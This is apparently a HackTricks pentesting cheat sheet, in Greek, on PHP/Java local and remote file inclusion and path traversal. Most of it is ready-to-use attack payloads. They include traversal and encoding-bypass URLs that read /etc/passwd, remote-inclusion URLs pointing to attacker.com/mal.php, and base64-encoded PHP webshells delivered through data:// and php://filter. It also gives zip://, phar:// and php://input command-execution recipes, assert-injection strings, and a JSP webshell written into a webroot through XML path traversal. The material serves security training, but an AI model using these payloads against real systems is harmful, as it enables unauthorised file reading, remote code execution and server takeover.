# File Inclusion/Path traversal

{{#include ../../banners/hacktricks-training.md}}

## File Inclusion

**Remote File Inclusion (RFI):** Το αρχείο φορτώνεται από έναν απομακρυσμένο server (Best: You can write the code and the server will execute it). Στο php αυτό είναι **απενεργοποιημένο** από προεπιλογή (**allow_url_include**).\
**Local File Inclusion (LFI):** Ο server φορτώνει ένα τοπικό file.

Η ευπάθεια προκύπτει όταν ο χρήστης μπορεί με κάποιο τρόπο να ελέγξει το file που πρόκειται να φορτωθεί από τον server.

Ευάλωτες **PHP functions**: require, require_once, include, include_once

Ένα ενδιαφέρον εργαλείο για να εκμεταλλευτείς αυτή την ευπάθεια: [https://github.com/kurobeats/fimap](https://github.com/kurobeats/fimap)

## Blind - Interesting - LFI2RCE files
```python
wfuzz -c -w ./lfi2.txt --hw 0 http://10.10.10.10/nav.php?page=../../../../../../../FUZZ
```
### **Linux**

**Συνδυάζοντας διάφορες \*nix LFI λίστες και προσθέτοντας περισσότερες διαδρομές δημιούργησα αυτήν:**


{{#ref}}
https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/file_inclusion_linux.txt
{{#endref}}

Δοκίμασε επίσης να αλλάξεις `/` με `\`\
Δοκίμασε επίσης να προσθέσεις `../../../../../`

Μια λίστα που χρησιμοποιεί διάφορες τεχνικές για να βρει το αρχείο /etc/password (για να ελεγχθεί αν υπάρχει η ευπάθεια) μπορεί να βρεθεί [here](https://github.com/xmendez/wfuzz/blob/master/wordlist/vulns/dirTraversal-nix.txt)

### **Windows**

Merge of different wordlists:


{{#ref}}
https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/file_inclusion_windows.txt
{{#endref}}

Δοκίμασε επίσης να αλλάξεις `/` με `\`\
Δοκίμασε επίσης να αφαιρέσεις `C:/` και να προσθέσεις `../../../../../`

Μια λίστα που χρησιμοποιεί διάφορες τεχνικές για να βρει το αρχείο /boot.ini (για να ελεγχθεί αν υπάρχει η ευπάθεια) μπορεί να βρεθεί [here](https://github.com/xmendez/wfuzz/blob/master/wordlist/vulns/dirTraversal-win.txt)

### **OS X**

Έλεγξε τη λίστα LFI του linux.

## Βασικά LFI και bypasses

All the examples are for Local File Inclusion but could be applied to Remote File Inclusion also (page=[http://myserver.com/phpshellcode.txt\\](<http://myserver.com/phpshellcode.txt)/>).
```
http://example.com/index.php?page=../../../etc/passwd
```
### traversal sequences αφαιρούνται μη-αναδρομικά
```python
http://example.com/index.php?page=....//....//....//etc/passwd
http://example.com/index.php?page=....\/....\/....\/etc/passwd
http://some.domain.com/static/%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c/etc/passwd
```
### **Null byte (%00)**

Bypass της προσθήκης επιπλέον χαρακτήρων στο τέλος της δοθείσας συμβολοσειράς (bypass of: $\_GET\['param']."php")
```
http://example.com/index.php?page=../../../etc/passwd%00
```
Αυτό έχει **επιλυθεί από PHP 5.4**

### **Encoding**

Μπορείτε να χρησιμοποιήσετε μη-τυπικά encodings όπως double URL encode (και άλλα):
```
http://example.com/index.php?page=..%252f..%252f..%252fetc%252fpasswd
http://example.com/index.php?page=..%c0%af..%c0%af..%c0%afetc%c0%afpasswd
http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd
http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd%00
```
### Από υπάρχον φάκελο

Ίσως το back-end ελέγχει τη διαδρομή του φακέλου:
```python
http://example.com/index.php?page=utils/scripts/../../../../../etc/passwd
```
### Εξερεύνηση καταλόγων του συστήματος αρχείων σε έναν διακομιστή

Το σύστημα αρχείων ενός διακομιστή μπορεί να εξερευνηθεί αναδρομικά για τον εντοπισμό καταλόγων, όχι μόνο αρχείων, χρησιμοποιώντας ορισμένες τεχνικές. Αυτή η διαδικασία περιλαμβάνει τον προσδιορισμό του βάθους των καταλόγων και την έρευνα για την ύπαρξη συγκεκριμένων φακέλων. Παρακάτω υπάρχει μια λεπτομερής μέθοδος για να το πετύχετε:

1. **Καθορισμός Βάθους Καταλόγου:** Προσδιορίστε το βάθος του τρέχοντος καταλόγου κάνοντας επιτυχή ανάκτηση του αρχείου `/etc/passwd` (ισχύει αν ο διακομιστής βασίζεται σε Linux). Ένα παράδειγμα URL μπορεί να έχει τη δομή παρακάτω, υποδεικνύοντας βάθος τριών:
```bash
http://example.com/index.php?page=../../../etc/passwd # depth of 3
```
2. **Έλεγχος φακέλων:** Προσθέστε το όνομα του ύποπτου φακέλου (π.χ., `private`) στο URL, στη συνέχεια πλοηγηθείτε πίσω στο `/etc/passwd`. Το επιπλέον επίπεδο καταλόγου απαιτεί αύξηση του βάθους κατά ένα:
```bash
http://example.com/index.php?page=private/../../../../etc/passwd # depth of 3+1=4
```
3. **Ερμηνεύστε τα Αποτελέσματα:** Η απάντηση του διακομιστή δείχνει αν ο φάκελος υπάρχει:
- **Σφάλμα / Καμία Έξοδος:** Ο φάκελος `private` πιθανότατα δεν υπάρχει στην καθορισμένη τοποθεσία.
- **Περιεχόμενο του `/etc/passwd`:** Η παρουσία του φακέλου `private` επιβεβαιώνεται.
4. **Αναδρομική Εξερεύνηση:** Οι εντοπισμένοι φάκελοι μπορούν να ερευνηθούν περαιτέρω για υποκαταλόγους ή αρχεία χρησιμοποιώντας την ίδια τεχνική ή τις παραδοσιακές μεθόδους Local File Inclusion (LFI).

Για να εξερευνήσετε καταλόγους σε διαφορετικές τοποθεσίες στο σύστημα αρχείων, προσαρμόστε ανάλογα το payload. Για παράδειγμα, για να ελέγξετε αν το `/var/www/` περιέχει έναν κατάλογο `private` (υποθέτοντας ότι ο τρέχων κατάλογος βρίσκεται σε βάθος 3), χρησιμοποιήστε:
```bash
http://example.com/index.php?page=../../../var/www/private/../../../etc/passwd
```
### **Path Truncation Technique**

Path truncation είναι μια μέθοδος που χρησιμοποιείται για τη χειραγώγηση διαδρομών αρχείων σε εφαρμογές web. Συχνά χρησιμοποιείται για την πρόσβαση σε περιορισμένα αρχεία παρακάμπτοντας ορισμένα μέτρα ασφαλείας που προσθέτουν επιπλέον χαρακτήρες στο τέλος των διαδρομών αρχείων. Ο στόχος είναι να δημιουργηθεί μια διαδρομή αρχείου που, αφού τροποποιηθεί από το μέτρο ασφαλείας, εξακολουθεί να δείχνει στο επιθυμητό αρχείο.

Στο PHP, διάφορες αναπαραστάσεις μιας διαδρομής αρχείου μπορούν να θεωρηθούν ισοδύναμες λόγω της φύσης του συστήματος αρχείων. Για παράδειγμα:

- `/etc/passwd`, `/etc//passwd`, `/etc/./passwd`, and `/etc/passwd/` are all treated as the same path.
- Όταν οι τελευταίοι 6 χαρακτήρες είναι `passwd`, η προσθήκη ενός `/` (κάνοντάς το `passwd/`) δεν αλλάζει το στοχευόμενο αρχείο.
- Ομοίως, αν προσαρτηθεί `.php` σε μια διαδρομή αρχείου (π.χ. `shellcode.php`), η προσθήκη `/.` στο τέλος δεν θα αλλάξει το προσπελασμένο αρχείο.

Τα παραδείγματα που παρέχονται δείχνουν πώς να χρησιμοποιήσετε το path truncation για να αποκτήσετε πρόσβαση στο `/etc/passwd`, έναν κοινό στόχο λόγω του ευαίσθητου περιεχομένου του (πληροφορίες λογαριασμών χρηστών):
```
http://example.com/index.php?page=a/../../../../../../../../../etc/passwd......[ADD MORE]....
http://example.com/index.php?page=a/../../../../../../../../../etc/passwd/././.[ADD MORE]/././.
```

```
http://example.com/index.php?page=a/./.[ADD MORE]/etc/passwd
http://example.com/index.php?page=a/../../../../[ADD MORE]../../../../../etc/passwd
```
Σε αυτά τα σενάρια, ο αριθμός των traversals που απαιτούνται μπορεί να είναι περίπου 2027, αλλά αυτός ο αριθμός μπορεί να διαφέρει ανάλογα με τη διαμόρφωση του διακομιστή.

- **Using Dot Segments and Additional Characters**: Σειρές traversal (`../`) σε συνδυασμό με επιπλέον dot segments και χαρακτήρες μπορούν να χρησιμοποιηθούν για να πλοηγηθούν στο σύστημα αρχείων, αγνοώντας στην πράξη τις προσαρτημένες συμβολοσειρές από τον διακομιστή.
- **Determining the Required Number of Traversals**: Μέσω δοκιμών και λαθών, μπορεί κανείς να βρει τον ακριβή αριθμό των ακολουθιών `../` που απαιτούνται για να φτάσει στον root κατάλογο και στη συνέχεια στο `/etc/passwd`, εξασφαλίζοντας ότι οποιεσδήποτε προσαρτημένες συμβολοσειρές (όπως `.php`) εξουδετερώνονται αλλά η επιθυμητή διαδρομή (`/etc/passwd`) παραμένει ανέπαφη.
- **Starting with a Fake Directory**: Είναι συνηθισμένη πρακτική να ξεκινά η διαδρομή με έναν μη-υπάρχοντα κατάλογο (π.χ. `a/`). Αυτή η τεχνική χρησιμοποιείται ως προληπτικό μέτρο ή για να ικανοποιήσει τις απαιτήσεις της λογικής ανάλυσης διαδρομών του διακομιστή.

Όταν εφαρμόζονται path truncation techniques, είναι κρίσιμο να κατανοηθεί η συμπεριφορά της ανάλυσης διαδρομών από τον διακομιστή και η δομή του συστήματος αρχείων. Κάθε σενάριο μπορεί να απαιτεί διαφορετική προσέγγιση, και συχνά είναι απαραίτητο να γίνουν δοκιμές για να βρεθεί η πιο αποτελεσματική μέθοδος.

**This vulnerability was corrected in PHP 5.3.**

### **Filter bypass tricks**
```
http://example.com/index.php?page=....//....//etc/passwd
http://example.com/index.php?page=..///////..////..//////etc/passwd
http://example.com/index.php?page=/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd
Maintain the initial path: http://example.com/index.php?page=/var/www/../../etc/passwd
http://example.com/index.php?page=PhP://filter
```
## Remote File Inclusion

Στο php αυτό είναι απενεργοποιημένο από προεπιλογή επειδή **`allow_url_include`** είναι **Off.** Πρέπει να είναι **On** για να λειτουργήσει, και σε αυτή την περίπτωση θα μπορούσατε να συμπεριλάβετε ένα PHP αρχείο από τον διακομιστή σας και να αποκτήσετε RCE:
```python
http://example.com/index.php?page=http://atacker.com/mal.php
http://example.com/index.php?page=\\attacker.com\shared\mal.php
```
Εάν για κάποιο λόγο το **`allow_url_include`** είναι **Ενεργό**, αλλά το PHP φιλτράρει την πρόσβαση σε εξωτερικές ιστοσελίδες, [σύμφωνα με αυτή την ανάρτηση](https://matan-h.com/one-lfi-bypass-to-rule-them-all-using-base64/), μπορείτε να χρησιμοποιήσετε, για παράδειγμα, το data protocol με base64 για να αποκωδικοποιήσετε έναν b64 PHP κώδικα και να αποκτήσετε RCE:
```
PHP://filter/convert.base64-decode/resource=data://plain/text,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+.txt
```
> [!TIP]
> Στον προηγούμενο κώδικα, το τελικό `+.txt` προστέθηκε επειδή ο επιτιθέμενος χρειάστηκε μια συμβολοσειρά που τελειώνει σε `.txt`, έτσι η συμβολοσειρά τελειώνει με αυτό και μετά το b64 decode εκείνο το μέρος θα επιστρέψει απλώς άχρηστα δεδομένα και ο πραγματικός PHP κώδικας θα συμπεριληφθεί (και επομένως, εκτελεστεί).

Another example **not using the `php://` protocol** would be:
```
data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+txt
```
## Python ριζικό στοιχείο

Σε python, σε έναν κώδικα σαν τον παρακάτω:
```python
# file_name is controlled by a user
os.path.join(os.getcwd(), "public", file_name)
```
Αν ο χρήστης περάσει μια **απόλυτη διαδρομή** στο **`file_name`**, η **προηγούμενη διαδρομή απλώς αφαιρείται**:
```python
os.path.join(os.getcwd(), "public", "/etc/passwd")
'/etc/passwd'
```
Αυτό είναι η αναμενόμενη συμπεριφορά σύμφωνα με [the docs](https://docs.python.org/3.10/library/os.path.html#os.path.join):

> Εάν ένα στοιχείο είναι απόλυτη διαδρομή, όλα τα προηγούμενα στοιχεία απορρίπτονται και η σύνδεση συνεχίζεται από το στοιχείο της απόλυτης διαδρομής.

## Java Λίστα καταλόγων

Φαίνεται πως αν έχετε ένα Path Traversal σε Java και **ζητήσετε έναν κατάλογο** αντί για αρχείο, **επιστρέφεται μια λίστα του καταλόγου**. Αυτό δεν συμβαίνει σε άλλες γλώσσες (afaik).

## Top 25 παράμετροι

Ακολουθεί λίστα με τις κορυφαίες 25 παραμέτρους που θα μπορούσαν να είναι ευάλωτες σε local file inclusion (LFI) vulnerabilities (από [link](https://twitter.com/trbughunters/status/1279768631845494787)):
```
?cat={payload}
?dir={payload}
?action={payload}
?board={payload}
?date={payload}
?detail={payload}
?file={payload}
?download={payload}
?path={payload}
?folder={payload}
?prefix={payload}
?include={payload}
?page={payload}
?inc={payload}
?locate={payload}
?show={payload}
?doc={payload}
?site={payload}
?type={payload}
?view={payload}
?content={payload}
?document={payload}
?layout={payload}
?mod={payload}
?conf={payload}
```
## LFI / RFI using PHP wrappers & protocols

### php://filter

Οι PHP φίλτρα επιτρέπουν την εκτέλεση βασικών **λειτουργιών τροποποίησης στα δεδομένα** πριν αυτά διαβαστούν ή γραφτούν. Υπάρχουν 5 κατηγορίες φίλτρων:

- [String Filters](https://www.php.net/manual/en/filters.string.php):
- `string.rot13`
- `string.toupper`
- `string.tolower`
- `string.strip_tags`: Αφαιρεί ετικέτες από τα δεδομένα (οτιδήποτε μεταξύ των χαρακτήρων "<" και ">")
- Σημειώστε ότι αυτό το φίλτρο έχει αφαιρεθεί από τις σύγχρονες εκδόσεις του PHP
- [Conversion Filters](https://www.php.net/manual/en/filters.convert.php)
- `convert.base64-encode`
- `convert.base64-decode`
- `convert.quoted-printable-encode`
- `convert.quoted-printable-decode`
- `convert.iconv.*` : Μετατρέπει σε διαφορετική κωδικοποίηση (`convert.iconv.<input_enc>.<output_enc>`). Για να πάρετε τη **λίστα όλων των κωδικοποιήσεων** που υποστηρίζονται τρέξτε στην κονσόλα: `iconv -l`

> [!WARNING]
> Καταχρηστικά χρησιμοποιώντας το `convert.iconv.*` conversion filter μπορείτε να **παράγετε αυθαίρετο κείμενο**, το οποίο μπορεί να είναι χρήσιμο για την εγγραφή αυθαίρετου κειμένου ή για να αναγκάσετε μια συνάρτηση όπως include να επεξεργαστεί αυθαίρετο κείμενο. Για περισσότερες πληροφορίες δείτε [**LFI2RCE via php filters**](lfi2rce-via-php-filters.md).

- [Compression Filters](https://www.php.net/manual/en/filters.compression.php)
- `zlib.deflate`: Συμπιέζει το περιεχόμενο (useful if exfiltrating a lot of info)
- `zlib.inflate`: Αποσυμπιέζει τα δεδομένα
- [Encryption Filters](https://www.php.net/manual/en/filters.encryption.php)
- `mcrypt.*` : Αποσυρμένο
- `mdecrypt.*` : Αποσυρμένο
- Other Filters
- Τρέχοντας στο php `var_dump(stream_get_filters());` μπορείτε να βρείτε μερικά **μη αναμενόμενα φίλτρα**:
- `consumed`
- `dechunk`: αντιστρέφει την HTTP chunked κωδικοποίηση
- `convert.*`
```php
# String Filters
## Chain string.toupper, string.rot13 and string.tolower reading /etc/passwd
echo file_get_contents("php://filter/read=string.toupper|string.rot13|string.tolower/resource=file:///etc/passwd");
## Same chain without the "|" char
echo file_get_contents("php://filter/string.toupper/string.rot13/string.tolower/resource=file:///etc/passwd");
## string.string_tags example
echo file_get_contents("php://filter/string.strip_tags/resource=data://text/plain,<b>Bold</b><?php php code; ?>lalalala");

# Conversion filter
## B64 decode
echo file_get_contents("php://filter/convert.base64-decode/resource=data://plain/text,aGVsbG8=");
## Chain B64 encode and decode
echo file_get_contents("php://filter/convert.base64-encode|convert.base64-decode/resource=file:///etc/passwd");
## convert.quoted-printable-encode example
echo file_get_contents("php://filter/convert.quoted-printable-encode/resource=data://plain/text,£hellooo=");
=C2=A3hellooo=3D
## convert.iconv.utf-8.utf-16le
echo file_get_contents("php://filter/convert.iconv.utf-8.utf-16le/resource=data://plain/text,trololohellooo=");

# Compresion Filter
## Compress + B64
echo file_get_contents("php://filter/zlib.deflate/convert.base64-encode/resource=file:///etc/passwd");
readfile('php://filter/zlib.inflate/resource=test.deflated'); #To decompress the data locally
# note that PHP protocol is case-inselective (that's mean you can use "PhP://" and any other varient)
```
> [!WARNING]
> Το μέρος "php://filter" δεν κάνει διάκριση πεζών/κεφαλαίων

### Using php filters as oracle to read arbitrary files

[**Σε αυτή την ανάρτηση**](https://www.synacktiv.com/publications/php-filter-chains-file-read-from-error-based-oracle) προτείνεται μια τεχνική για την ανάγνωση ενός local αρχείου χωρίς να επιστραφεί το output από τον server. Αυτή η τεχνική βασίζεται σε μια **boolean exfiltration του αρχείου (char by char) χρησιμοποιώντας php filters** ως oracle. Αυτό συμβαίνει επειδή τα php filters μπορούν να χρησιμοποιηθούν για να κάνουν ένα κείμενο αρκετά μεγάλο ώστε το php να πετάξει exception.

Στην original post θα βρείτε μία λεπτομερή εξήγηση της τεχνικής, αλλά εδώ είναι μια γρήγορη περίληψη:

- Use the codec **`UCS-4LE`** to leave leading character of the text at the begging and make the size of string increases exponentially.
- Αυτό θα χρησιμοποιηθεί για να δημιουργήσει ένα **κείμενο τόσο μεγάλο όταν ο αρχικός χαρακτήρας μαντευτεί σωστά** που το php θα προκαλέσει ένα **σφάλμα**
- Ο φίλτρο **dechunk** θα **αφαιρέσει τα πάντα αν ο πρώτος char δεν είναι hex**, οπότε μπορούμε να ξέρουμε αν ο πρώτος char είναι hex.
- Αυτό, σε συνδυασμό με το προηγούμενο (και άλλους filters ανάλογα με το μαντεμένο γράμμα), θα μας επιτρέψει να μαντέψουμε ένα γράμμα στην αρχή του κειμένου βλέποντας πότε εφαρμόζοντας αρκετές μετασχηματίσεις γίνεται να μην είναι πλέον hexadecimal χαρακτήρας. Επειδή αν είναι hex, ο dechunk δεν θα το διαγράψει και η αρχική βόμβα θα κάνει php error.
- Ο codec **convert.iconv.UNICODE.CP930** μετασχηματίζει κάθε γράμμα στο επόμενο (οπότε μετά από αυτόν τον codec: a -> b). Αυτό μας επιτρέπει να ανακαλύψουμε αν ο πρώτος χαρακτήρας είναι `a` για παράδειγμα γιατί αν εφαρμόσουμε 6 από αυτόν τον codec a->b->c->d->e->f->g το γράμμα δεν είναι πλέον hexadecimal χαρακτήρας, επομένως ο dechunk δεν το διαγράφει και το php error ενεργοποιείται επειδή πολλαπλασιάζεται με την αρχική βόμβα.
- Χρησιμοποιώντας άλλους μετασχηματισμούς όπως **rot13** στην αρχή είναι δυνατό να leak άλλους chars όπως n, o, p, q, r (και άλλοι codecs μπορούν να χρησιμοποιηθούν για να μετακινήσουν άλλα γράμματα στο hex range).
- Όταν ο αρχικός char είναι αριθμός χρειάζεται να γίνει base64 encode και να leak οι 2 πρώτοι χαρακτήρες για να leak τον αριθμό.
- Το τελικό πρόβλημα είναι να δούμε **πώς να leak περισσότερα από το αρχικό γράμμα**. Χρησιμοποιώντας order memory filters όπως **convert.iconv.UTF16.UTF-16BE, convert.iconv.UCS-4.UCS-4LE, convert.iconv.UCS-4.UCS-4LE** είναι δυνατό να αλλάξεις τη σειρά των chars και να φέρεις στην πρώτη θέση άλλα γράμματα του κειμένου.
- Και για να μπορέσουμε να αποκτήσουμε **further data** η ιδέα είναι να **παράγουμε 2 bytes junk data στην αρχή** με **convert.iconv.UTF16.UTF16**, να εφαρμόσουμε **UCS-4LE** για να το **pivot με τα επόμενα 2 bytes**, και να **delete τα δεδομένα μέχρι τα junk data** (αυτό θα αφαιρέσει τα πρώτα 2 bytes του αρχικού κειμένου). Συνεχίστε έτσι μέχρι να φτάσετε στο επιθυμητό bit για να leak.

In the post a tool to perform this automatically was also leaked: [php_filters_chain_oracle_exploit](https://github.com/synacktiv/php_filter_chains_oracle_exploit).

### php://fd

This wrapper allows to access file descriptors that the process has open. Potentially useful to exfiltrate the content of opened files:
```php
echo file_get_contents("php://fd/3");
$myfile = fopen("/etc/passwd", "r");
```
Μπορείτε επίσης να χρησιμοποιήσετε **php://stdin, php://stdout και php://stderr** για να αποκτήσετε πρόσβαση στους **περιγραφείς αρχείων 0, 1 και 2** αντίστοιχα (δεν είμαι σίγουρος/η πώς αυτό θα μπορούσε να είναι χρήσιμο σε μια επίθεση)

### zip:// and rar://

Ανέβασε ένα αρχείο Zip ή Rar με ένα PHPShell μέσα και πρόσβασέ το.\
Για να είναι δυνατή η κατάχρηση του πρωτοκόλλου rar, αυτό **πρέπει να ενεργοποιηθεί ειδικά**.
```bash
echo "<pre><?php system($_GET['cmd']); ?></pre>" > payload.php;
zip payload.zip payload.php;
mv payload.zip shell.jpg;
rm payload.php

http://example.com/index.php?page=zip://shell.jpg%23payload.php

# To compress with rar
rar a payload.rar payload.php;
mv payload.rar shell.jpg;
rm payload.php
http://example.com/index.php?page=rar://shell.jpg%23payload.php
```
### data://
```
http://example.net/?page=data://text/plain,<?php echo base64_encode(file_get_contents("index.php")); ?>
http://example.net/?page=data://text/plain,<?php phpinfo(); ?>
http://example.net/?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=
http://example.net/?page=data:text/plain,<?php echo base64_encode(file_get_contents("index.php")); ?>
http://example.net/?page=data:text/plain,<?php phpinfo(); ?>
http://example.net/?page=data:text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=
NOTE: the payload is "<?php system($_GET['cmd']);echo 'Shell done !'; ?>"
```
Σημειώστε ότι αυτό το πρωτόκολλο περιορίζεται από τις ρυθμίσεις του php **`allow_url_open`** και **`allow_url_include`**

### expect://

Το Expect πρέπει να είναι ενεργοποιημένο. Μπορείτε να εκτελέσετε κώδικα χρησιμοποιώντας αυτό:
```
http://example.com/index.php?page=expect://id
http://example.com/index.php?page=expect://ls
```
### input://

Καθορίστε το payload σας στις παραμέτρους POST:
```bash
curl -XPOST "http://example.com/index.php?page=php://input" --data "<?php system('id'); ?>"
```
### phar://

Ένα αρχείο `.phar` μπορεί να χρησιμοποιηθεί για την εκτέλεση PHP κώδικα όταν μια web εφαρμογή αξιοποιεί συναρτήσεις όπως η `include` για τη φόρτωση αρχείων. Το παρακάτω απόσπασμα κώδικα PHP δείχνει τη δημιουργία ενός αρχείου `.phar`:
```php
<?php
$phar = new Phar('test.phar');
$phar->startBuffering();
$phar->addFromString('test.txt', 'text');
$phar->setStub('<?php __HALT_COMPILER(); system("ls"); ?>');
$phar->stopBuffering();
```
Για να δημιουργηθεί το αρχείο `.phar`, πρέπει να εκτελεστεί η ακόλουθη εντολή:
```bash
php --define phar.readonly=0 create_path.php
```
Κατά την εκτέλεση, θα δημιουργηθεί ένα αρχείο με όνομα `test.phar`, το οποίο θα μπορούσε ενδεχομένως να αξιοποιηθεί για την εκμετάλλευση ευπαθειών Local File Inclusion (LFI).

Σε περιπτώσεις όπου το LFI μόνο διαβάζει αρχεία χωρίς να εκτελεί τον PHP κώδικα που περιέχουν, μέσω συναρτήσεων όπως `file_get_contents()`, `fopen()`, `file()`, `file_exists()`, `md5_file()`, `filemtime()`, ή `filesize()`, μπορεί να επιχειρηθεί εκμετάλλευση μιας deserialization vulnerability. Αυτή η ευπάθεια σχετίζεται με το διάβασμα αρχείων χρησιμοποιώντας το πρωτόκολλο `phar`.

For a detailed understanding of exploiting deserialization vulnerabilities in the context of `.phar` files, refer to the document linked below:

[Phar Deserialization Exploitation Guide](phar-deserialization.md)


{{#ref}}
phar-deserialization.md
{{#endref}}

### CVE-2024-2961

It was possible to abuse **any arbitrary file read from PHP that supports php filters** to get a RCE. The detailed description can be [**found in this post**](https://www.ambionics.io/blog/iconv-cve-2024-2961-p1)**.**\
Very quick summary: a **3 byte overflow** in the PHP heap was abused to **alter the chain of free chunks** of anspecific size in order to be able to **write anything in any address**, so a hook was added to call **`system`**.\
It was possible to alloc chunks of specific sizes abusing more php filters.

### More protocols

Ελέγξτε περισσότερα πιθανά[ **protocols to include here**](https://www.php.net/manual/en/wrappers.php)**:**

- [php://memory and php://temp](https://www.php.net/manual/en/wrappers.php.php#wrappers.php.memory) — Εγγραφή στη μνήμη ή σε προσωρινό αρχείο (δεν είναι σαφές πώς αυτό μπορεί να είναι χρήσιμο σε μια file inclusion attack)
- [file://](https://www.php.net/manual/en/wrappers.file.php) — Πρόσβαση στο τοπικό filesystem
- [http://](https://www.php.net/manual/en/wrappers.http.php) — Πρόσβαση σε HTTP(s) URLs
- [ftp://](https://www.php.net/manual/en/wrappers.ftp.php) — Πρόσβαση σε FTP(s) URLs
- [zlib://](https://www.php.net/manual/en/wrappers.compression.php) — Compression Streams
- [glob://](https://www.php.net/manual/en/wrappers.glob.php) — Εύρεση μονοπατιών που ταιριάζουν με πρότυπο (Δεν επιστρέφει τίποτα εκτυπώσιμο, οπότε δεν είναι πραγματικά χρήσιμο εδώ)
- [ssh2://](https://www.php.net/manual/en/wrappers.ssh2.php) — Secure Shell 2
- [ogg://](https://www.php.net/manual/en/wrappers.audio.php) — Audio streams (Δεν είναι χρήσιμο για την ανάγνωση arbitrary files)

## LFI via PHP's 'assert'

Οι κίνδυνοι από Local File Inclusion (LFI) στο PHP είναι ιδιαίτερα υψηλοί όταν υπάρχει η συνάρτηση 'assert', η οποία μπορεί να εκτελέσει κώδικα μέσα σε strings. Αυτό είναι ιδιαίτερα προβληματικό εάν γίνει έλεγχος σε είσοδο που περιέχει χαρακτήρες directory traversal όπως ".." αλλά δεν γίνεται σωστή απολύμανση.

For example, PHP code might be designed to prevent directory traversal like so:
```bash
assert("strpos('$file', '..') === false") or die("");
```
Ενώ αυτό στοχεύει στο να σταματήσει το traversal, δημιουργεί ακούσια ένα vector για code injection. Για να το exploit για την ανάγνωση του περιεχομένου ενός αρχείου, ένας attacker θα μπορούσε να χρησιμοποιήσει:
```plaintext
' and die(highlight_file('/etc/passwd')) or '
```
Παρομοίως, για την εκτέλεση αυθαίρετων εντολών συστήματος, κάποιος μπορεί να χρησιμοποιήσει:
```plaintext
' and die(system("id")) or '
```
It's important to **URL-encode these payloads**.

## PHP Blind Path Traversal

> [!WARNING]
> Αυτή η τεχνική είναι σχετική σε περιπτώσεις όπου εσείς **ελέγχετε** τη **διαδρομή αρχείου** μιας **PHP function** που θα **αποκτήσει πρόσβαση σε ένα αρχείο**, αλλά δεν θα δείτε το περιεχόμενο του αρχείου (όπως μια απλή κλήση σε **`file()`**) καθώς το περιεχόμενο δεν εμφανίζεται.

In [**this incredible post**](https://www.synacktiv.com/en/publications/php-filter-chains-file-read-from-error-based-oracle.html) it's explained how a blind path traversal can be abused via PHP filter to **exfiltrate the content of a file via an error oracle**.

Συνοπτικά, η τεχνική χρησιμοποιεί την κωδικοποίηση **"UCS-4LE"** για να κάνει το περιεχόμενο ενός αρχείου τόσο **μεγάλο** που η **PHP function που ανοίγει** το αρχείο θα προκαλέσει ένα **error**.

Στη συνέχεια, για να leak τον πρώτο χαρακτήρα χρησιμοποιείται το φίλτρο **`dechunk`** μαζί με άλλα όπως **base64** ή **rot13** και τελικά τα φίλτρα **convert.iconv.UCS-4.UCS-4LE** και **convert.iconv.UTF16.UTF-16BE** χρησιμοποιούνται για να **τοποθετήσουν άλλους χαρακτήρες στην αρχή και να τους leak**.

**Συναρτήσεις που μπορεί να είναι ευάλωτες**: `file_get_contents`, `readfile`, `finfo->file`, `getimagesize`, `md5_file`, `sha1_file`, `hash_file`, `file`, `parse_ini_file`, `copy`, `file_put_contents (only target read only with this)`, `stream_get_contents`, `fgets`, `fread`, `fgetc`, `fgetcsv`, `fpassthru`, `fputs`

Για τεχνικές λεπτομέρειες δείτε το προαναφερθέν post!

## LFI2RCE

### Arbitrary File Write via Path Traversal (Webshell RCE)

When server-side code that ingests/uploads files builds the destination path using user-controlled data (e.g., a filename or URL) without canonicalising and validating it, `..` segments and absolute paths can escape the intended directory and cause an arbitrary file write. If you can place the payload under a web-exposed directory, you usually get unauthenticated RCE by dropping a webshell.

Typical exploitation workflow:
- Εντοπίστε ένα write primitive σε ένα endpoint ή background worker που δέχεται ένα path/filename και γράφει περιεχόμενο στο δίσκο (π.χ. message-driven ingestion, XML/JSON command handlers, ZIP extractors, κτλ.).
- Προσδιορίστε web-exposed directories. Συνηθισμένα παραδείγματα:
- Apache/PHP: `/var/www/html/`
- Tomcat/Jetty: `<tomcat>/webapps/ROOT/` → drop `shell.jsp`
- IIS: `C:\inetpub\wwwroot\` → drop `shell.aspx`
- Σχεδιάστε μια traversal διαδρομή που θα σπάσει έξω από τον προοριζόμενο κατάλογο αποθήκευσης προς το webroot, και τοποθετήστε μέσα το περιεχόμενο της webshell σας.
- Περιηγηθείτε στο dropped payload και εκτελέστε εντολές.

Σημειώσεις:
- Η ευάλωτη υπηρεσία που εκτελεί τη εγγραφή μπορεί να ακούει σε μια μη-HTTP θύρα (π.χ. ένας JMF XML listener στο TCP 4004). Το κύριο web portal (διαφορετική θύρα) θα σερβίρει αργότερα το payload σας.
- Στους Java stacks, αυτές οι εγγραφές αρχείων συχνά υλοποιούνται με απλή concatenation `File`/`Paths`. Η έλλειψη canonicalisation/allow-listing είναι το βασικό σφάλμα.

Generic XML/JMF-style example (product schemas vary – the DOCTYPE/body wrapper is irrelevant for the traversal):
```xml
<?xml version="1.0" encoding="UTF-8"?>
<JMF SenderID="hacktricks" Version="1.3">
<Command Type="SubmitQueueEntry">
<!-- Write outside the intake folder into the webroot via traversal -->
<Resource Name="FileName">../../../webapps/ROOT/shell.jsp</Resource>
<Data>
<![CDATA[
<%@ page import="java.io.*" %>
<%
String c = request.getParameter("cmd");
if (c != null) {
Process p = Runtime.getRuntime().exec(c);
try (var in = p.getInputStream(); var out = response.getOutputStream()) {
in.transferTo(out);
}
}
%>
]]>
</Data>
</Command>
</JMF>
```
Σκληροποίηση που εξουδετερώνει αυτή την κατηγορία σφαλμάτων:
